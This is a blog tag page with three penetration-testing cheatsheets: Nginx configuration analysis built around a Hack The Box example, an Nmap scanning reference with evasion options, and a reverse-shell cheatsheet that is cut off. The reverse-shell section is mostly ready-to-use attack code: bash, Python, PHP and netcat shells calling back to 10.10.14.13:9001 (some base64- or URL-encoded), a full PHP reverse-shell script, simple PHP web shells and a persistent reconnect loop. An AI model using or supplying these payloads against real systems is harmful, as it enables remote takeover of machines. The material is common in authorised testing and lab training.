  <footer class="entry-footer"><span title='2024-01-01 00:00:00 +0000 UTC'>January 1, 2024</span>&nbsp;·&nbsp;<span>9 min</span>&nbsp;·&nbsp;<span>realspaceeagle</span></footer>
  <a class="entry-link" aria-label="post link to Linux Privilege Escalation Cheatsheet" href="https://realspaceeagle.github.io/cheatsheets/linux-privilege-escalation/"></a>
</article>

<article class="post-entry tag-entry"> 
  <header class="entry-header">
    <h2 class="entry-hint-parent">Nginx Configuration Analysis Cheatsheet
    </h2>
  </header>
  <div class="entry-content">
    <p>Nginx Configuration Analysis Cheatsheet Finding Nginx Configuration Files Common Configuration Locations # Main nginx configuration /etc/nginx/nginx.conf /usr/local/nginx/conf/nginx.conf /usr/local/etc/nginx/nginx.conf # Site-specific configurations /etc/nginx/sites-available/ /etc/nginx/sites-enabled/ /etc/nginx/conf.d/ # Default site configuration /etc/nginx/sites-available/default /etc/nginx/sites-enabled/default # Additional includes /etc/nginx/snippets/ /etc/nginx/modules-enabled/ Finding Configuration Files # Locate nginx configuration find / -name &#34;nginx.conf&#34; 2&gt;/dev/null find / -name &#34;*.conf&#34; -path &#34;*nginx*&#34; 2&gt;/dev/null # Check nginx process for config location ps aux | grep nginx nginx -t # Test configuration and show file paths nginx -T # Dump configuration # Find all nginx-related files locate nginx.conf locate sites-available locate sites-enabled Main Configuration Analysis nginx.conf Structure # Global context user www-data; worker_processes auto; pid /run/nginx.pid; include /etc/nginx/modules-enabled/*.conf; # Events context events { worker_connections 768; multi_accept on; use epoll; } # HTTP context http { # Basic settings sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; server_tokens off; # Security: Hide nginx version # MIME types include /etc/nginx/mime.types; default_type application/octet-stream; # Logging access_log /var/log/nginx/access.log; error_log /var/log/nginx/error.log; # Gzip compression gzip on; gzip_vary on; gzip_proxied any; gzip_comp_level 6; # Include site configurations include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*; } Security-Relevant Directives # Check for security headers grep -r &#34;server_tokens&#34; /etc/nginx/ grep -r &#34;add_header&#34; /etc/nginx/ # Version disclosure grep -r &#34;server_tokens&#34; /etc/nginx/ # Should be: server_tokens off; # File upload limits grep -r &#34;client_max_body_size&#34; /etc/nginx/ # Request limits grep -r &#34;limit_req&#34; /etc/nginx/ grep -r &#34;limit_conn&#34; /etc/nginx/ Virtual Host Discovery Finding Virtual Hosts # List all site configurations ls -la /etc/nginx/sites-available/ ls -la /etc/nginx/sites-enabled/ # Extract server names from configurations grep -r &#34;server_name&#34; /etc/nginx/sites-available/ grep -r &#34;server_name&#34; /etc/nginx/sites-enabled/ # Check for wildcard or catch-all configurations grep -r &#34;server_name.*\*&#34; /etc/nginx/ grep -r &#34;default_server&#34; /etc/nginx/ Virtual Host Configuration Analysis # Example virtual host configuration server { listen 80; listen [::]:80; # Primary domain and aliases server_name example.com www.example.com; # Document root root /var/www/html; index index.html index.htm index.php; # Locations location / { try_files $uri $uri/ =404; } location ~ \.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/var/run/php/php7.4-fpm.sock; } } # Subdomain configuration server { listen 80; server_name subdomain.example.com; location / { proxy_pass http://localhost:3000; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &#39;upgrade&#39;; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; } } Real-World Example: Soccer HTB # From Soccer HTB - Multiple virtual hosts found server { listen 80; listen [::]:80; server_name soccer.htb; root /var/www/html; index index.html index.htm index.nginx-debian.html; location / { try_files $uri $uri/ =404; } } # Additional virtual host discovered server { listen 80; listen [::]:80; server_name soc-player.soccer.htb; root /root/app/views; location / { proxy_pass http://localhost:3000; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &#39;upgrade&#39;; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; } } Proxy Configuration Analysis Reverse Proxy Configurations # Basic reverse proxy location / { proxy_pass http://backend_server; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } # WebSocket proxy configuration location /websocket { proxy_pass http://localhost:9091; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &#34;upgrade&#34;; proxy_set_header Host $host; } # Load balancing upstream backend { server 192.168.1.10:8080; server 192.168.1.11:8080; server 192.168.1.12:8080; } location / { proxy_pass http://backend; } Proxy Security Issues # Check for missing security headers grep -r &#34;proxy_set_header.*X-Forwarded&#34; /etc/nginx/ grep -r &#34;proxy_set_header.*Host&#34; /etc/nginx/ # Check for proxy_pass misconfigurations grep -r &#34;proxy_pass&#34; /etc/nginx/ # Look for internal service exposure grep -r &#34;proxy_pass.*127.0.0.1\|localhost&#34; /etc/nginx/ # Check for missing trailing slashes (path traversal) grep -r &#34;proxy_pass.*[^/]$&#34; /etc/nginx/ SSL/TLS Configuration Analysis SSL Configuration server { listen 443 ssl http2; listen [::]:443 ssl http2; server_name example.com; # SSL certificates ssl_certificate /path/to/cert.pem; ssl_certificate_key /path/to/private.key; # SSL protocols and ciphers ssl_protocols TLSv1.2 TLSv1.3; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384; ssl_prefer_server_ciphers off; # SSL security headers add_header Strict-Transport-Security &#34;max-age=63072000&#34; always; add_header X-Frame-Options DENY; add_header X-Content-Type-Options nosniff; } SSL Security Checks # Check SSL configuration grep -r &#34;ssl_&#34; /etc/nginx/ # Check for weak SSL protocols grep -r &#34;ssl_protocols&#34; /etc/nginx/ # Should not include SSLv2, SSLv3, TLSv1, TLSv1.1 # Check SSL certificate paths grep -r &#34;ssl_certificate&#34; /etc/nginx/ # Check for HSTS headers grep -r &#34;Strict-Transport-Security&#34; /etc/nginx/ # Check for security headers grep -r &#34;add_header&#34; /etc/nginx/ Location Block Analysis Location Matching Patterns # Exact match location = /exact-path { return 200 &#34;Exact match&#34;; } # Prefix match location /prefix { # Matches /prefix, /prefix/, /prefix/anything } # Regular expression (case sensitive) location ~ \.php$ { # Matches files ending with .php } # Regular expression (case insensitive) location ~* \.(jpg|jpeg|png|gif)$ { # Matches image files (case insensitive) } # Prefix match with priority location ^~ /priority { # High priority prefix match } Security-Critical Locations # Check for admin/management interfaces grep -r &#34;location.*admin&#34; /etc/nginx/ grep -r &#34;location.*management&#34; /etc/nginx/ grep -r &#34;location.*dashboard&#34; /etc/nginx/ # Check for file upload locations grep -r &#34;location.*upload&#34; /etc/nginx/ grep -r &#34;client_max_body_size&#34; /etc/nginx/ # Check for API endpoints grep -r &#34;location.*api&#34; /etc/nginx/ grep -r &#34;location.*/api&#34; /etc/nginx/ # Check for hidden files/directories grep -r &#34;location.*\\\.&#34; /etc/nginx/ Dangerous Location Configurations # Dangerous: Unrestricted file access location /files/ { alias /var/www/files/; # Can lead to path traversal } # Dangerous: PHP execution in upload directory location /uploads/ { location ~ \.php$ { fastcgi_pass unix:/var/run/php/php7.4-fmp.sock; # Allows execution of uploaded PHP files } } # Dangerous: Proxy without validation location /proxy/ { proxy_pass $arg_url; # Open proxy vulnerability } Access Control Analysis Access Restrictions # IP-based access control location /admin { allow 192.168.1.0/24; allow 127.0.0.1; deny all; } # Authentication required location /protected { auth_basic &#34;Protected Area&#34;; auth_basic_user_file /etc/nginx/.htpasswd; } # Rate limiting limit_req_zone $binary_remote_addr zone=login:10m rate=1r/s; location /login { limit_req zone=login burst=5 nodelay; } Access Control Issues # Check for missing access controls grep -r &#34;allow\|deny&#34; /etc/nginx/ grep -r &#34;auth_basic&#34; /etc/nginx/ # Check for rate limiting grep -r &#34;limit_req&#34; /etc/nginx/ grep -r &#34;limit_conn&#34; /etc/nginx/ # Check for CORS configurations grep -r &#34;add_header.*Access-Control&#34; /etc/nginx/ File and Directory Analysis Document Root Analysis # Find document roots grep -r &#34;root &#34; /etc/nginx/sites-available/ grep -r &#34;alias &#34; /etc/nginx/sites-available/ # Check document root permissions ls -la /var/www/html/ ls -la /root/app/views/ # From Soccer HTB example # Look for sensitive files in document roots find /var/www/ -name &#34;*.conf&#34; -o -name &#34;*.config&#34; -o -name &#34;*.bak&#34; 2&gt;/dev/null find /var/www/ -name &#34;.env&#34; -o -name &#34;*.sql&#34; -o -name &#34;*.log&#34; 2&gt;/dev/null File Serving Configuration # Check autoindex settings grep -r &#34;autoindex&#34; /etc/nginx/ # Check for hidden file access grep -r &#34;location.*\\\.&#34; /etc/nginx/ # Check MIME type configurations grep -r &#34;mime.types&#34; /etc/nginx/ grep -r &#34;default_type&#34; /etc/nginx/ Log Analysis Nginx Log Configuration # Access log format log_format main &#39;$remote_addr - $remote_user [$time_local] &#34;$request&#34; &#39; &#39;$status $body_bytes_sent &#34;$http_referer&#34; &#39; &#39;&#34;$http_user_agent&#34; &#34;$http_x_forwarded_for&#34;&#39;; access_log /var/log/nginx/access.log main; error_log /var/log/nginx/error.log warn; # Custom log for specific location location /api/ { access_log /var/log/nginx/api.log; } Log File Analysis # Find nginx log files find /var/log -name &#34;*nginx*&#34; 2&gt;/dev/null grep -r &#34;access_log\|error_log&#34; /etc/nginx/ # Analyze access logs for reconnaissance tail -f /var/log/nginx/access.log grep &#34;404&#34; /var/log/nginx/access.log | head -20 grep &#34;POST&#34; /var/log/nginx/access.log | head -10 # Look for error patterns tail -f /var/log/nginx/error.log grep -i &#34;error\|fail\|denied&#34; /var/log/nginx/error.log Module and Extension Analysis Loaded Modules # Check compiled modules nginx -V 2&gt;&amp;1 | grep -o with-[a-z_]* nginx -V 2&gt;&amp;1 | grep -o without-[a-z_]* # Check dynamic modules ls -la /etc/nginx/modules-enabled/ ls -la /usr/lib/nginx/modules/ # Check module loading in config grep -r &#34;load_module&#34; /etc/nginx/ Security-Relevant Modules # Check for security modules nginx -V 2&gt;&amp;1 | grep -i &#34;security\|waf\|firewall&#34; # Check for authentication modules nginx -V 2&gt;&amp;1 | grep -i &#34;auth&#34; # Check for rate limiting modules nginx -V 2&gt;&amp;1 | grep -i &#34;limit&#34; # Check for SSL/TLS modules nginx -V 2&gt;&amp;1 | grep -i &#34;ssl\|tls&#34; Configuration Testing and Validation Syntax Testing # Test nginx configuration syntax nginx -t nginx -T # Test and dump configuration # Test specific configuration file nginx -t -c /path/to/nginx.conf # Check configuration hierarchy nginx -T | grep -E &#34;^#|server_name|listen|location&#34; Runtime Analysis # Check running nginx processes ps aux | grep nginx # Check listening ports ss -tlnp | grep nginx netstat -tlnp | grep nginx # Check nginx status (if enabled) curl http://localhost/nginx_status Common Misconfigurations Path Traversal Issues # Vulnerable alias configuration location /files { alias /var/www/files/; # Missing trailing slash can cause path traversal } # Correct configuration location /files/ { alias /var/www/files/; } Information Disclosure # Version disclosure server_tokens on; # Should be off # Autoindex enabled location / { autoindex on; # May expose directory contents } # Error page information disclosure error_page 404 /404.html; # Should use custom error pages Proxy Misconfigurations # Open proxy vulnerability location /proxy { proxy_pass $arg_url; # Dangerous - allows arbitrary URLs } # SSRF via proxy_pass location ~ /proxy/(.&#43;) { proxy_pass http://$1; # Can access internal services } Extraction Commands for Pentesting Quick Configuration Extraction # Extract all server names (virtual hosts) grep -r &#34;server_name&#34; /etc/nginx/ | grep -v &#34;#&#34; | awk &#39;{print $2}&#39; | sort -u # Extract all proxy_pass destinations grep -r &#34;proxy_pass&#34; /etc/nginx/ | grep -v &#34;#&#34; | awk &#39;{print $2}&#39; | sort -u # Extract all document roots grep -r &#34;root &#34; /etc/nginx/ | grep -v &#34;#&#34; | awk &#39;{print $2}&#39; | sort -u # Extract all listening ports grep -r &#34;listen&#34; /etc/nginx/ | grep -v &#34;#&#34; | awk &#39;{print $2}&#39; | sort -u One-liner Configuration Analysis # Complete nginx configuration dump find /etc/nginx -name &#34;*.conf&#34; -exec cat {} \; 2&gt;/dev/null # Extract virtual hosts with their configurations awk &#39;/server_name/ {server=$2} /listen/ {port=$2} /root/ {docroot=$2} /}/ {print server, port, docroot; server=&#34;&#34;; port=&#34;&#34;; docroot=&#34;&#34;}&#39; /etc/nginx/sites-enabled/* # Find potential security issues grep -r -E &#34;(server_tokens on|autoindex on|proxy_pass \$|allow all)&#34; /etc/nginx/ Real-World Example: Soccer HTB Analysis Initial Discovery # Found nginx configuration in compromised system www-data@soccer:/etc/nginx/sites-enabled$ ls -la total 8 drwxr-xr-x 2 root root 4096 Nov 17 2022 . drwxr-xr-x 8 root root 4096 Nov 17 2022 .. lrwxrwxrwx 1 root root 34 Nov 17 2022 default -&gt; /etc/nginx/sites-available/default lrwxrwxrwx 1 root root 41 Nov 17 2022 soc-player.htb -&gt; /etc/nginx/sites-available/soc-player.htb Configuration Analysis # Extract virtual host information $ cat soc-player.htb server { listen 80; listen [::]:80; server_name soc-player.soccer.htb; root /root/app/views; location / { proxy_pass http://localhost:3000; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &#39;upgrade&#39;; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; } } Key Findings Additional virtual host discovered: soc-player.soccer.htb Internal service exposed: Application running on localhost:3000 WebSocket support: Configuration for WebSocket upgrades Document root: /root/app/views (unusual location) Automation Scripts Nginx Configuration Parser #!/bin/bash # nginx_analyzer.sh - Extract key information from nginx configs NGINX_PATH=&#34;/etc/nginx&#34; echo &#34;=== Nginx Configuration Analysis ===&#34; echo echo &#34;Virtual Hosts:&#34; grep -r &#34;server_name&#34; $NGINX_PATH/ | grep -v &#34;#&#34; | awk &#39;{print $3}&#39; | sort -u echo echo &#34;Listening Ports:&#34; grep -r &#34;listen&#34; $NGINX_PATH/ | grep -v &#34;#&#34; | awk &#39;{print $2}&#39; | sort -u | head -10 echo echo &#34;Proxy Destinations:&#34; grep -r &#34;proxy_pass&#34; $NGINX_PATH/ | grep -v &#34;#&#34; | awk &#39;{print $2}&#39; | sort -u echo echo &#34;Document Roots:&#34; grep -r &#34;root &#34; $NGINX_PATH/ | grep -v &#34;#&#34; | awk &#39;{print $2}&#39; | sort -u echo echo &#34;Potential Security Issues:&#34; grep -r -E &#34;(server_tokens on|autoindex on|allow all)&#34; $NGINX_PATH/ 2&gt;/dev/null Security Recommendations Hardening Configuration # Security headers add_header X-Frame-Options DENY; add_header X-Content-Type-Options nosniff; add_header X-XSS-Protection &#34;1; mode=block&#34;; add_header Strict-Transport-Security &#34;max-age=31536000; includeSubDomains&#34;; # Hide nginx version server_tokens off; # Rate limiting limit_req_zone $binary_remote_addr zone=global:10m rate=10r/s; limit_req zone=global burst=20 nodelay; # File upload restrictions client_max_body_size 10M; # Disable autoindex autoindex off; Monitoring and Logging # Enhanced logging format log_format detailed &#39;$remote_addr - $remote_user [$time_local] &#39; &#39;&#34;$request&#34; $status $body_bytes_sent &#39; &#39;&#34;$http_referer&#34; &#34;$http_user_agent&#34; &#39; &#39;$request_time $upstream_response_time&#39;; # Log monitoring commands tail -f /var/log/nginx/access.log | grep -E &#34;(4[0-9]{2}|5[0-9]{2})&#34; awk &#39;$9 ~ /^[45]/ {print $0}&#39; /var/log/nginx/access.log | tail -20 Always ensure proper authorization before analyzing nginx configurations on systems you don’t own. This information should be used for legitimate security testing and system administration purposes only.
</p>
  </div>
  <footer class="entry-footer"><span title='2024-01-01 00:00:00 +0000 UTC'>January 1, 2024</span>&nbsp;·&nbsp;<span>9 min</span>&nbsp;·&nbsp;<span>realspaceeagle</span></footer>
  <a class="entry-link" aria-label="post link to Nginx Configuration Analysis Cheatsheet" href="https://realspaceeagle.github.io/cheatsheets/nginx-configuration-analysis/"></a>
</article>

<article class="post-entry tag-entry"> 
  <header class="entry-header">
    <h2 class="entry-hint-parent">Nmap Cheatsheet - Complete Port Scanning Reference
    </h2>
  </header>
  <div class="entry-content">
    <p>Nmap Cheatsheet - Complete Reference Guide Basic Scanning Simple Host Scan # Basic scan of single host nmap 192.168.1.100 # Scan multiple hosts nmap 192.168.1.100-110 nmap 192.168.1.100,102,104 # Scan subnet nmap 192.168.1.0/24 Common Port Ranges # Scan top 1000 ports (default) nmap target # Scan specific ports nmap -p 80,443,22,21 target # Scan port ranges nmap -p 1-65535 target nmap -p- target # All ports shorthand # Scan top ports nmap --top-ports 100 target Host Discovery Ping Scans # No port scan, just ping nmap -sn 192.168.1.0/24 # TCP SYN ping nmap -PS target # TCP ACK ping nmap -PA target # UDP ping nmap -PU target # Skip ping (assume host is up) nmap -Pn target ARP Discovery # ARP ping scan (local network) nmap -PR 192.168.1.0/24 # List scan (no ping, no port scan) nmap -sL 192.168.1.0/24 Port Scanning Techniques TCP Scans # TCP SYN scan (default, stealthy) nmap -sS target # TCP Connect scan (full connection) nmap -sT target # TCP ACK scan (firewall detection) nmap -sA target # TCP Window scan nmap -sW target # TCP Maimon scan nmap -sM target UDP Scans # UDP scan (slow but important) nmap -sU target # Combined TCP/UDP scan nmap -sS -sU target # Fast UDP scan (top ports) nmap -sU --top-ports 100 target Specialized Scans # FIN scan (stealth) nmap -sF target # NULL scan (stealth) nmap -sN target # Xmas scan (stealth) nmap -sX target # Idle scan (ultra stealth) nmap -sI zombie_host target Service &amp; Version Detection Version Detection # Service version detection nmap -sV target # Aggressive version detection nmap -sV --version-intensity 9 target # Light version detection nmap -sV --version-intensity 2 target OS Detection # OS fingerprinting nmap -O target # Aggressive OS detection nmap -O --osscan-guess target # OS detection with version scanning nmap -O -sV target Combined Detection # Aggressive scan (OS, version, scripts, traceroute) nmap -A target # Standard aggressive scan with common ports nmap -A -T4 target Script Engine (NSE) Default Scripts # Run default scripts nmap -sC target nmap --script=default target # Combine with version detection nmap -sC -sV target Script Categories # Vulnerability scripts nmap --script=vuln target # Authentication scripts nmap --script=auth target # Brute force scripts nmap --script=brute target # Discovery scripts nmap --script=discovery target # Malware detection nmap --script=malware target Specific Scripts # HTTP enumeration nmap --script=http-enum target # SMB enumeration nmap --script=smb-enum-shares target # DNS information nmap --script=dns-brute target # SSL certificate info nmap --script=ssl-cert target # Heartbleed detection nmap --script=ssl-heartbleed target Script Arguments # Pass arguments to scripts nmap --script=http-form-brute --script-args userdb=users.txt,passdb=pass.txt target # Multiple script arguments nmap --script=smb-brute --script-args userdb=users.txt,unpwdb.timelimit=60s target Stealth &amp; Evasion Timing Templates # Paranoid (very slow, IDS evasion) nmap -T0 target # Sneaky (slow, IDS evasion) nmap -T1 target # Polite (normal, no bandwidth flooding) nmap -T2 target # Normal (default) nmap -T3 target # Aggressive (fast, reliable networks) nmap -T4 target # Insane (very fast, sacrifice accuracy) nmap -T5 target Firewall Evasion # Fragment packets nmap -f target # Specify MTU nmap --mtu 24 target # Decoy scanning nmap -D RND:10 target nmap -D decoy1,decoy2,ME,decoy3 target # Source IP spoofing nmap -S spoofed_ip target # Source port specification nmap --source-port 53 target nmap -g 53 target Advanced Evasion # Random delay between probes nmap --scan-delay 5s target # Random host order nmap --randomize-hosts target # Bad checksum (firewall testing) nmap --badsum target # Data length nmap --data-length 25 target Output Formats Standard Output # Normal output nmap target # Verbose output nmap -v target nmap -vv target # More verbose # Debug output nmap -d target nmap -dd target # More debug info File Output # Normal format nmap -oN scan_results.txt target # XML format nmap -oX scan_results.xml target # Grepable format nmap -oG scan_results.gnmap target # All formats nmap -oA scan_results target # Script kiddie format nmap -oS scan_results.txt target Advanced Techniques Performance Optimization # Parallel host scanning nmap --min-hostgroup 50 --max-hostgroup 100 target # Parallel port scanning nmap --min-parallelism 50 --max-parallelism 100 target # Packet rate control nmap --min-rate 1000 --max-rate 5000 target # Timeout control nmap --host-timeout 300s target Network Interface Control # Specify interface nmap -e eth0 target # Specify source IP nmap -S 192.168.1.50 target # IPv6 scanning nmap -6 target Firewall/IDS Testing # ACK scan for firewall rules nmap -sA -p 1-1000 target # Window scan for firewall detection nmap -sW target # FIN scan to bypass simple firewalls nmap -sF target Practical Examples Web Server Enumeration # Comprehensive web server scan nmap -p 80,443 -sV --script=http-enum,http-headers,http-methods,ssl-cert target # WordPress enumeration nmap -p 80,443 --script=http-wordpress-enum target SMB Enumeration # Complete SMB enumeration nmap -p 445 --script=smb-enum-domains,smb-enum-groups,smb-enum-processes,smb-enum-sessions,smb-enum-shares,smb-enum-users target # SMB vulnerability scan nmap -p 445 --script=smb-vuln-* target Database Enumeration # MySQL enumeration nmap -p 3306 --script=mysql-enum,mysql-info,mysql-databases,mysql-variables target # MSSQL enumeration nmap -p 1433 --script=ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell target # Oracle enumeration nmap -p 1521 --script=oracle-sid-brute,oracle-enum-users target Mail Server Enumeration # SMTP enumeration nmap -p 25,465,587 --script=smtp-enum-users,smtp-commands,smtp-open-relay target # POP3/IMAP enumeration nmap -p 110,143,993,995 --script=pop3-capabilities,imap-capabilities target NSE Script Development Basic Script Structure -- nmap script example local nmap = require &#34;nmap&#34; local shortport = require &#34;shortport&#34; description = [[ Script description here ]] author = &#34;Your Name&#34; license = &#34;Same as Nmap--See https://nmap.org/book/man-legal.html&#34; categories = {&#34;default&#34;, &#34;discovery&#34;} portrule = shortport.port_or_service(80, &#34;http&#34;) action = function(host, port) return &#34;Script output&#34; end Common Nmap Commands Quick Reference Command Description nmap -sS target TCP SYN scan nmap -sU target UDP scan nmap -sV target Version detection nmap -O target OS detection nmap -A target Aggressive scan nmap -sC target Default scripts nmap -p- target All ports nmap -T4 target Aggressive timing nmap -Pn target Skip ping nmap -oA results target All output formats Tips &amp; Best Practices Performance Tips Use -T4 for faster scans on reliable networks Combine -sS -sU for comprehensive coverage Use --top-ports for quick reconnaissance Leverage --min-rate and --max-rate for speed control Stealth Considerations Use -T0 or -T1 for stealth scanning Implement decoy scanning with -D Fragment packets with -f to evade detection Use source port manipulation with -g Legal &amp; Ethical Notes ⚠️ Warning: Only scan systems you own or have explicit permission to test. Unauthorized scanning may be illegal in your jurisdiction.
...</p>
  </div>
  <footer class="entry-footer"><span title='2024-01-01 00:00:00 +0000 UTC'>January 1, 2024</span>&nbsp;·&nbsp;<span>5 min</span>&nbsp;·&nbsp;<span>realspaceeagle</span></footer>
  <a class="entry-link" aria-label="post link to Nmap Cheatsheet - Complete Port Scanning Reference" href="https://realspaceeagle.github.io/cheatsheets/nmap/"></a>
</article>

<article class="post-entry tag-entry"> 
  <header class="entry-header">
    <h2 class="entry-hint-parent">Reverse Shell Cheatsheet
    </h2>
  </header>
  <div class="entry-content">
    <p>Reverse Shell Cheatsheet Setup Listener Netcat Listener # Basic netcat listener nc -nlvp 9001 # Enhanced with rlwrap for better shell experience rlwrap nc -nlvp 9001 # OpenBSD netcat nc -nlvp 9001 # Traditional netcat nc -l -p 9001 Socat Listener # Basic socat listener socat file:`tty`,raw,echo=0 tcp-listen:9001 # Encrypted socat listener socat openssl-listen:9001,cert=server.crt,key=server.key,verify=0 - Bash Reverse Shells Basic Bash # Standard bash reverse shell bash -i &gt;&amp; /dev/tcp/10.10.14.13/9001 0&gt;&amp;1 # Alternative syntax bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.13/9001 0&gt;&amp;1&#39; # URL encoded for web applications bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.13%2F9001%200%3E%261%27 # Base64 encoded echo YmFzaCAtaSA&#43;JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy85MDAxIDA&#43;JjE= | base64 -d | bash Bash Variations # Using exec exec 5&lt;&gt;/dev/tcp/10.10.14.13/9001;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # Using /bin/sh /bin/sh -i &gt;&amp; /dev/tcp/10.10.14.13/9001 0&gt;&amp;1 # With specific shell path /usr/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.13/9001 0&gt;&amp;1 Python Reverse Shells Python 2 &amp; 3 Compatible # Standard Python reverse shell python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.13&#34;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39; # Python with pty spawn python -c &#39;import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.13&#34;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/sh&#34;);&#39; # Python3 specific python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.13&#34;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39; Python PTY Shell # Interactive shell with PTY python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; # Local Python PTY spawn (after getting basic shell) /usr/local/bin/python3 -c &#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39; Advanced Python Shell # Multi-line Python reverse shell import socket, subprocess, os, threading, sys def s2p(s, p): while True: data = s.recv(1024) if len(data) &gt; 0: p.stdin.write(data) p.stdin.flush() def p2s(s, p): while True: s.send(p.stdout.read(1)) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&#34;10.10.14.13&#34;, 9001)) p = subprocess.Popen([&#34;/bin/sh&#34;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE) s2p_thread = threading.Thread(target=s2p, args=[s, p]) p2s_thread = threading.Thread(target=p2s, args=[s, p]) s2p_thread.daemon = True p2s_thread.daemon = True s2p_thread.start() p2s_thread.start() try: p.wait() except KeyboardInterrupt: s.close() PHP Reverse Shells Basic PHP # Simple PHP reverse shell php -r &#39;$sock=fsockopen(&#34;10.10.14.13&#34;,9001);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39; # PHP with error handling php -r &#39;$sock=fsockopen(&#34;10.10.14.13&#34;,9001);if($sock){$proc=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);}&#39; Web-based PHP Shell &lt;?php set_time_limit(0); $ip = &#39;10.10.14.13&#39;; $port = 9001; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = &#39;uname -a; w; id; /bin/sh -i&#39;; $daemon = 0; $debug = 0; if (function_exists(&#39;pcntl_fork&#39;)) { $pid = pcntl_fork(); if ($pid == -1) { printit(&#34;ERROR: Can&#39;t fork&#34;); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit(&#34;Error: Can&#39;t setsid()&#34;); exit(1); } $daemon = 1; } else { printit(&#34;WARNING: Failed to daemonise. This is quite common and not fatal.&#34;); } chdir(&#34;/&#34;); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(&#34;$errstr ($errno)&#34;); exit(1); } $descriptorspec = array( 0 =&gt; array(&#34;pipe&#34;, &#34;r&#34;), 1 =&gt; array(&#34;pipe&#34;, &#34;w&#34;), 2 =&gt; array(&#34;pipe&#34;, &#34;w&#34;) ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(&#34;ERROR: Can&#39;t spawn shell&#34;); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(&#34;Successfully opened reverse shell to $ip:$port&#34;); while (1) { if (feof($sock)) { printit(&#34;ERROR: Shell connection terminated&#34;); break; } if (feof($pipes[1])) { printit(&#34;ERROR: Shell process terminated&#34;); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit(&#34;SOCK READ&#34;); $input = fread($sock, $chunk_size); if ($debug) printit(&#34;SOCK: $input&#34;); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit(&#34;STDOUT READ&#34;); $input = fread($pipes[1], $chunk_size); if ($debug) printit(&#34;STDOUT: $input&#34;); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit(&#34;STDERR READ&#34;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(&#34;STDERR: $input&#34;); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) { if (!$daemon) { print &#34;$string\n&#34;; } } ?&gt; PHP Command Execution # Simple PHP command execution &lt;?php system($_GET[&#39;cmd&#39;]); ?&gt; # More advanced web shell &lt;?php if(isset($_GET[&#39;cmd&#39;])) { echo &#34;&lt;pre&gt;&#34; . shell_exec($_GET[&#39;cmd&#39;]) . &#34;&lt;/pre&gt;&#34;; } ?&gt; # POST request shell # POST /shell.php # cmd=bash -c &#39;bash -i /dev/tcp/10.10.14.13/9001 0&gt;&amp;1&#39; Netcat Reverse Shells Traditional Netcat # Basic netcat reverse shell nc -e /bin/sh 10.10.14.13 9001 # Alternative if -e is not available rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.13 9001 &gt;/tmp/f # Using ncat (Nmap&#39;s netcat) ncat 10.10.14.13 9001 -e /bin/bash # OpenBSD netcat nc 10.10.14.13 9001 -e /bin/sh Advanced Netcat # Netcat with PTY nc -e /bin/bash 10.10.14.13 9001 # Netcat persistent shell while true; do nc -e /bin/bash 10.10.14.13 9001; sleep 60; done # UDP reverse shell nc -u 10.10.14.13 9001 